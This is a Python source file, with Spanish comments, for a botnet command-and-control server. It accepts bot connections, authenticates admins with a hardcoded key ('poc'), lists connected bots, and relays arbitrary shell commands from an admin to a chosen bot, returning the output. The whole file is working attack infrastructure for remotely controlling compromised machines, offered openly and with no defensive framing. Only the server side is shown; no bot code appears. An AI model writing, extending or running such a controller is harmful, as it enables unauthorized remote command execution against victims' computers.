import socket
import threading
from colorama import Fore
import os
import time

green = Fore.LIGHTGREEN_EX
cyan = Fore.LIGHTCYAN_EX
red = Fore.LIGHTRED_EX
reset = Fore.RESET
white = Fore.LIGHTWHITE_EX
magenta = Fore.LIGHTMAGENTA_EX

host = "localhost"
port = 4444
admin_key = "poc"

conexions = []
bots = []

# Comprobar sistema operativo del servidor
system = None
clear_command = None

if os.name == "posix":
    system = "linux"
    clear_command = "clear"
else:
    system = "windows"
    clear_command = "cls"

def handleOrder(admin, bot):
    print(f"{cyan}[+] El administrador {white}{admin.getpeername()} {cyan}ha establecido una conexion con el bot {white}{bot.getpeername()[1]}{reset}")
    admin.sendall(f"Sesion conectada con: {bot.getpeername()}. Empieze a ingresar comandos a ejecutar".encode())
    while True:
        try:
            order = admin.recv(1024).decode()
            if not order or order.lower() == "exit":
                break
            # Enviamos la orden al bot
            bot.sendall(order.encode())
            # Recibimos el output del comando
            cmd_output = bot.recv(4096).decode()
            if not cmd_output:
                admin.sendall(f"{red}[!]{white} Comando sin salida".encode())
                break
            admin.sendall(cmd_output.encode())
        except Exception as e:
            print(f"{red}[!]{white} Error en la conexion {reset}")
            break

def handleAdmin(conn, key):
    print(f"{green}[+]{white} Admin conectado con la clave {magenta}{key}{reset}")
    while True:
        try:
            comando = conn.recv(1024).decode()
            if not comando:
                print("Debes escribir un comando! Saliendo de la sesion...")
                break
            if comando == "bye":
                print(f"{cyan} [log] {white} El Administrador {red}{conn.getpeername()} {white} ha abandonado la botnet{reset}")
                break
            elif comando == "show":
                if len(conexions) == 0:
                    conn.sendall(f"   {red}[!] {white}No hay conexiones".encode())
                    continue
                conexiones_str = ""
                for conexion in conexions:
                    ip, puerto = conexion.getpeername()
                    conexiones_str += f"{white}  -  {ip}:{puerto}{cyan}\n"
                banner_show = f"""{cyan}
   ╔════════════════════════════════════════════════════════╗
   ║ {white}         BOTNET CONNECTIONS AVAILABLE                 {cyan}║
   ╟────────────────────────────────────────────────────────╢
   {conexiones_str}
   ╚════════════════════════════════════════════════════════╝{white}
"""
                conn.sendall(banner_show.encode())
            elif comando == "connect":
                print("Se ha usado la orden connect! ")
                if len(conexions) == 0:
                    conn.sendall("No hay ninguna conexion".encode())
                else:
                    conexiones_str = ""
                    for conexion in conexions:
                        ip, puerto = conexion.getpeername()
                        conexiones_str += f"{white}  -  {ip}:{puerto}{cyan}\n"
                    banner_show = f"""{cyan}
   ╔════════════════════════════════════════════════════════╗
   ║ {white}         BOTNET CONNECTIONS AVAILABLE                 {cyan}║
   ╟────────────────────────────────────────────────────────╢
   {conexiones_str}
   ╚════════════════════════════════════════════════════════╝{white}
"""
                    conn.sendall(banner_show.encode())
                    port_input = conn.recv(1024).decode().strip()
                    target_bot = None
                    for conexion in conexions:
                        if str(conexion.getpeername()[1]) == port_input:
                            target_bot = conexion
                            break
                    if not target_bot:
                        conn.sendall(f"Bot {port_input} no encontrado".encode())
                    else:
                        handleOrder(conn, target_bot)
            else:
                conn.sendall(f"[!] Ese comando no existe".encode())
            print(f"[logs] Comando recibido: {comando}")
        except Exception as e:
            print("Hubo un error en la conexion: ", e)
            print(f"{cyan} [log] {white} El Administrador {red}{conn.getpeername()} {white} ha abandonado la botnet{reset}")
            break
    conn.close()

def handleBot(conn, addr):
    conexions.append(conn)
    ip_bot, port_bot = addr
    print(f"{green}[+] {white}Bot conectado desde {ip_bot}:{port_bot} ")
    try:
        # Espera sin consumir datos para no interferir con la comunicación
        while True:
            time.sleep(1)
    except Exception as e:
        print(f"Error con la conexion del bot: {e}")
    if conn in conexions:
        conexions.remove(conn)
    conn.close()

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind((host, port))
    print("Server conectado")
    server_socket.listen()
    while True:
        conn, addr = server_socket.accept()
        key = conn.recv(1024).decode()
        if key == admin_key:
            admin_thread = threading.Thread(target=handleAdmin, args=(conn, admin_key))
            admin_thread.start()
        else:
            bot_thread = threading.Thread(target=handleBot, args=(conn, addr))
            bot_thread.start()
